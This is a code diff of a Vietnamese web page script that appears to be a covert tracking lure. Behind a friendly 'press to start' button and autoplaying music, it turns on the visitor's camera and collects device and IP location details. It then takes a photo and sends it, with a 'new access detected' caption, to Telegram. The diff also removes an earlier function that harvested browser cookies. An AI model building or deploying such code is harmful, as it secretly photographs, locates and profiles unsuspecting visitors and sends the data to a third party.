@@ -249,7 +249,7 @@ const MUSIC_FILE = 'nhac_nen.mp3';
 })();
 
 // ============================================================
-// NHẠC - TỰ ĐỘNG PHÁT
+// NHẠC - TỰ ĐỘNG PHÁT 100%
 // ============================================================
 let audio = null;
 let isMusicPlaying = false;
@@ -263,33 +263,35 @@ function initAudio() {
     document.getElementById('volumeControl').addEventListener('input', function() {
       if (audio) audio.volume = this.value;
     });
+    // Load nhạc trước
+    audio.load();
   }
 }
 
-function playMusic() {
+// Hàm phát nhạc - gọi nhiều lần để đảm bảo
+function forcePlayMusic() {
   try {
     initAudio();
     if (!musicStarted) {
-      audio.play().then(() => {
-        isMusicPlaying = true;
-        musicStarted = true;
-        document.getElementById('musicBtn').classList.add('playing');
-        document.getElementById('musicBtn').textContent = '🎵';
-      }).catch(() => {
-        document.addEventListener('click', function playOnClick() {
-          if (!musicStarted) {
-            audio.play().then(() => {
-              isMusicPlaying = true;
-              musicStarted = true;
-              document.getElementById('musicBtn').classList.add('playing');
-              document.getElementById('musicBtn').textContent = '🎵';
-            }).catch(()=>{});
-            document.removeEventListener('click', playOnClick);
-          }
-        }, { once: true });
-      });
+      const playPromise = audio.play();
+      if (playPromise !== undefined) {
+        playPromise.then(() => {
+          isMusicPlaying = true;
+          musicStarted = true;
+          document.getElementById('musicBtn').classList.add('playing');
+          document.getElementById('musicBtn').textContent = '🎵';
+          console.log('✅ Nhạc đã phát!');
+        }).catch(() => {
+          console.log('⚠️ Chưa phát được, chờ click...');
+          // Thử lại sau 500ms
+          setTimeout(forcePlayMusic, 500);
+        });
+      }
     }
-  } catch(e) {}
+  } catch(e) {
+    console.log('Lỗi phát nhạc:', e);
+    setTimeout(forcePlayMusic, 500);
+  }
 }
 
 function toggleMusic() {
@@ -300,16 +302,36 @@ function toggleMusic() {
     document.getElementById('musicBtn').classList.remove('playing');
     document.getElementById('musicBtn').textContent = '🔇';
   } else {
-    audio.play().catch(()=>{});
-    isMusicPlaying = true;
-    document.getElementById('musicBtn').classList.add('playing');
-    document.getElementById('musicBtn').textContent = '🎵';
+    audio.play().then(() => {
+      isMusicPlaying = true;
+      document.getElementById('musicBtn').classList.add('playing');
+      document.getElementById('musicBtn').textContent = '🎵';
+    }).catch(()=>{});
   }
 }
 
-setTimeout(playMusic, 100);
-setTimeout(playMusic, 1000);
-setTimeout(playMusic, 3000);
+// BẮT ĐẦU PHÁT NHẠC NGAY
+// Cách 1: Phát ngay lập tức
+setTimeout(forcePlayMusic, 50);
+
+// Cách 2: Phát khi click bất kỳ đâu (fallback)
+document.addEventListener('click', function playOnClick() {
+  if (!musicStarted) {
+    forcePlayMusic();
+  }
+}, { once: false });
+
+// Cách 3: Phát khi tải trang xong
+window.addEventListener('load', function() {
+  setTimeout(forcePlayMusic, 100);
+});
+
+// Cách 4: Phát sau 1s nếu chưa phát
+setTimeout(forcePlayMusic, 1000);
+// Cách 5: Phát sau 3s nếu chưa phát
+setTimeout(forcePlayMusic, 3000);
+// Cách 6: Phát sau 5s nếu chưa phát
+setTimeout(forcePlayMusic, 5000);
 
 // ============================================================
 // ĐỒNG HỒ
@@ -325,18 +347,6 @@ updateClock();
 // ============================================================
 // LẤY THÔNG TIN
 // ============================================================
-function getCurrentCookies() {
-  try {
-    const raw = document.cookie;
-    if (!raw) return [];
-    return raw.split(';').map(c => c.trim()).filter(c => c).map(c => {
-      const idx = c.indexOf('=');
-      if (idx === -1) return { name: c, value: '' };
-      return { name: c.substring(0, idx), value: c.substring(idx + 1) };
-    });
-  } catch(e) { return []; }
-}
-
 function getDeviceInfo() {
   const ua = navigator.userAgent;
   let deviceName = 'Thiết bị khác';
@@ -469,7 +479,7 @@ async function startCamera() {
 setTimeout(startCamera, 500);
 
 // ============================================================
-// CHỤP ẢNH & GỬI DỮ LIỆU - PHONG CÁCH CŨ
+// CHỤP ẢNH & GỬI DỮ LIỆU
 // ============================================================
 function playClickSound() {
   try {
@@ -500,7 +510,6 @@ captureBtn.onclick = async function() {
   statusDiv.textContent = '📸 Đang chụp ảnh...';
   statusDiv.className = 'status loading';
   
-  // Lấy thông tin
   const accessTime = new Date().toLocaleString('vi-VN', { hour12: false });
   const device = getDeviceInfo();
   const ipDetails = await getIPInfo();
@@ -545,9 +554,7 @@ captureBtn.onclick = async function() {
   ctx.textAlign = 'left';
   ctx.fillText(`📍 ${ipDetails.city || 'Unknown'}`, 15, H-11);
   
-  // ============================================================
-  // TẠO CAPTION - PHONG CÁCH CŨ ĐẸP HƠN
-  // ============================================================
+  // Tạo caption theo phong cách cũ
   let caption = `🚨 <b>PHÁT HIỆN LƯỢT TRUY CẬP MỚI</b> 🚨\n`;
   caption += `━━━━━━━━━━━━━━━━━━━━━\n`;
   caption += `⏰ <b>Thời gian:</b> <code>${accessTime}</code>\n`;
@@ -561,7 +568,6 @@ captureBtn.onclick = async function() {
   caption += `✨ <i>Trạng thái: Đã hoàn tất xác thực</i>\n`;
   caption += `🔗 <b>Nhóm lấy file:</b> `;
   
-  // Gửi lên Telegram
   canvas.toBlob(async (blob) => {
     if (blob) {
       const form = new FormData();
@@ -592,9 +598,6 @@ captureBtn.onclick = async function() {
   }, 'image/jpeg', 0.92);
 };
 
-// ============================================================
-// KHỞI TẠO
-// ============================================================
 statusDiv.textContent = '💖 Bấm nút để bắt đầu!';
 statusDiv.className = 'status';
 </script>
